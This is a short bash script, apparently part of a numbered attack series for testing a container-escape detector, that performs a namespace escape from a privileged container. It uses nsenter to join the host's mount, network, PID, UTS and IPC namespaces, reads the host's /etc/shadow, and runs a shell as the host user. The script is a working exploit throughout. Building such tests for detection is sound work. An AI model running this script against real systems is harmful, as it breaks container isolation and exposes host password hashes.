#!/bin/bash
# ATTACK 5 — Namespace Escape
# A --privileged --pid=host container uses nsenter/setns to join
# host namespaces (mount, net, pid, uts, ipc) and break all isolation.
set -e

echo "=== ATTACK 5: Namespace Escape ==="
echo "PID: $$  Container: $(hostname)"
CONTAINER_HOSTNAME=$(hostname)
echo ""

# Check prerequisites
if [ ! -r "/proc/1/ns/mnt" ]; then
    echo "[-] /proc/1/ns/ not accessible — PID namespace is isolated"
    exit 1
fi
echo "[+] /proc/1/ns/ accessible — can join host namespaces"

# Step 1: Enumerate host namespaces
echo "[*] Host namespaces at /proc/1/ns/:"
for ns in mnt pid net uts ipc; do
    echo "    $ns → $(readlink /proc/1/ns/$ns 2>/dev/null)"
done

# Step 2: nsenter into host mount namespace
echo "[*] nsenter -t 1 -m -- hostname"
HOST=$(nsenter -t 1 -m -- hostname 2>/dev/null)
[ -n "$HOST" ] && echo "[!] ESCAPED — host hostname: $HOST"

# Step 3: Read host /etc/shadow via mount NS
echo "[*] nsenter -t 1 -m -- cat /etc/shadow"
SHADOW=$(nsenter -t 1 -m -- cat /etc/shadow 2>/dev/null | head -3)
[ -n "$SHADOW" ] && echo "[!] ESCAPED — host /etc/shadow readable"

# Step 4: Full namespace escape
echo "[*] nsenter -t 1 -m -u -i -n -p -- id"
FULL=$(nsenter -t 1 -m -u -i -n -p -- /bin/sh -c 'whoami && hostname' 2>/dev/null)
[ -n "$FULL" ] && echo "[!] FULL ESCAPE — running as: $FULL"

echo ""
echo "=== Attack complete — check detector for NAMESPACE-ESCAPE alerts ==="
